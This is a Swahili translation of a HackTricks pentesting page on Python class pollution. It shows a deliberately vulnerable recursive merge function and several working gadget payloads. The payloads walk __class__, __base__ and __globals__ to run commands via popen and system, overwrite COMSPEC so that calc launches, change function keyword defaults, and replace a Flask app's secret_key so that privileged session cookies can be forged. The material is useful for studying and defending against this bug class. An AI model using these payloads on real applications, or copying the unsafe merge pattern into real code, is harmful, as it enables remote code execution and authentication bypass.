# Uchafuzi wa Darasa (Uchafuzi wa Prototype wa Python)

{{#include ../../banners/hacktricks-training.md}}

## Mfano wa Msingi

Angalia jinsi inavyowezekana kuchafua madarasa ya vitu kwa kutumia nyuzi:
```python
class Company: pass
class Developer(Company): pass
class Entity(Developer): pass

c = Company()
d = Developer()
e = Entity()

print(c) #<__main__.Company object at 0x1043a72b0>
print(d) #<__main__.Developer object at 0x1041d2b80>
print(e) #<__main__.Entity object at 0x1041d2730>

e.__class__.__qualname__ = 'Polluted_Entity'

print(e) #<__main__.Polluted_Entity object at 0x1041d2730>

e.__class__.__base__.__qualname__ = 'Polluted_Developer'
e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'

print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
```
## Mfano wa Msingi wa Uthibitisho
```python
# Initial state
class Employee: pass
emp = Employee()
print(vars(emp)) #{}

# Vulenrable function
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)


USER_INPUT = {
"name":"Ahemd",
"age": 23,
"manager":{
"name":"Sarah"
}
}

merge(USER_INPUT, emp)
print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
```
## Mfano wa Gadget

<details>

<summary>Kuunda thamani ya chaguo la mali ya darasa kwa RCE (subprocess)</summary>
```python
from os import popen
class Employee: pass # Creating an empty class
class HR(Employee): pass # Class inherits from Employee class
class Recruiter(HR): pass # Class inherits from HR class

class SystemAdmin(Employee): # Class inherits from Employee class
def execute_command(self):
command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

USER_INPUT = {
"__class__":{
"__base__":{
"__base__":{
"custom_command": "whoami"
}
}
}
}

recruiter_emp = Recruiter()
system_admin_emp = SystemAdmin()

print(system_admin_emp.execute_command())
#> [!] Executing: "echo Hello there", output: "Hello there"

# Create default value for Employee.custom_command
merge(USER_INPUT, recruiter_emp)

print(system_admin_emp.execute_command())
#> [!] Executing: "whoami", output: "abdulrah33m"
```
</details>

<details>

<summary>Kuchafua madarasa mengine na mabadiliko ya kimataifa kupitia <code>globals</code></summary>
```python
def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class User:
def __init__(self):
pass

class NotAccessibleClass: pass

not_accessible_variable = 'Hello'

merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Polluted variable','NotAccessibleClass':{'__qualname__':'PollutedClass'}}}}}, User())

print(not_accessible_variable) #> Polluted variable
print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
```
</details>

<details>

<summary>Utendaji wa subprocess wa kiholela</summary>
```python
import subprocess, json

class Employee:
def __init__(self):
pass

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

# Overwrite env var "COMSPEC" to execute a calc
USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value

merge(USER_INPUT, Employee())

subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
```
</details>

<details>

<summary>Kufuta <strong><code>__kwdefaults__</code></strong></summary>

**`__kwdefaults__`** ni sifa maalum ya kazi zote, kulingana na [nyaraka za Python](https://docs.python.org/3/library/inspect.html), ni “ramani ya thamani zozote za msingi kwa **parameta za neno funguo pekee**”. Kuingiza uchafu katika sifa hii inatupa uwezo wa kudhibiti thamani za msingi za parameta za neno funguo pekee za kazi, hizi ni parameta za kazi zinazokuja baada ya \* au \*args.
```python
from os import system
import json

def merge(src, dst):
# Recursive merge function
for k, v in src.items():
if hasattr(dst, '__getitem__'):
if dst.get(k) and type(v) == dict:
merge(v, dst.get(k))
else:
dst[k] = v
elif hasattr(dst, k) and type(v) == dict:
merge(v, getattr(dst, k))
else:
setattr(dst, k, v)

class Employee:
def __init__(self):
pass

def execute(*, command='whoami'):
print(f'Executing {command}')
system(command)

print(execute.__kwdefaults__) #> {'command': 'whoami'}
execute() #> Executing whoami
#> user

emp_info = json.loads('{"__class__":{"__init__":{"__globals__":{"execute":{"__kwdefaults__":{"command":"echo Polluted"}}}}}}') # attacker-controlled value
merge(emp_info, Employee())

print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
execute() #> Executing echo Polluted
#> Polluted
```
</details>

<details>

<summary>Kufuta siri ya Flask kati ya faili</summary>

Hivyo, ikiwa unaweza kufanya uchafuzi wa darasa juu ya kitu kilichofafanuliwa katika faili kuu ya python ya wavuti lakini **ambayo darasa lake limefafanuliwa katika faili tofauti** na ile kuu. Kwa sababu ili kufikia \_\_globals\_\_ katika payloads zilizopita unahitaji kufikia darasa la kitu au mbinu za darasa, utaweza **kufikia globals katika faili hiyo, lakini si katika ile kuu**. \
Hivyo, **hutaweza kufikia kitu cha kimataifa cha Flask app** ambacho kilifafanua **funguo ya siri** katika ukurasa kuu:
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
Katika hali hii unahitaji kifaa cha kupita faili ili kufikia faili kuu ili **kupata kitu cha ulimwengu `app.secret_key`** kubadilisha funguo ya siri ya Flask na kuwa na uwezo wa [**kuinua mamlaka** ukijua funguo hii](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload kama hii [kutoka kwa andiko hili](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Tumia payload hii kubadilisha **`app.secret_key`** (jina katika programu yako linaweza kuwa tofauti) ili uweze kusaini vidakuzi vya flask vipya na vya kibali zaidi.

</details>

Angalia pia ukurasa ufuatao kwa vifaa vya kusoma tu:

{{#ref}}
python-internal-read-gadgets.md
{{#endref}}

## Marejeo

- [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)

{{#include ../../banners/hacktricks-training.md}}
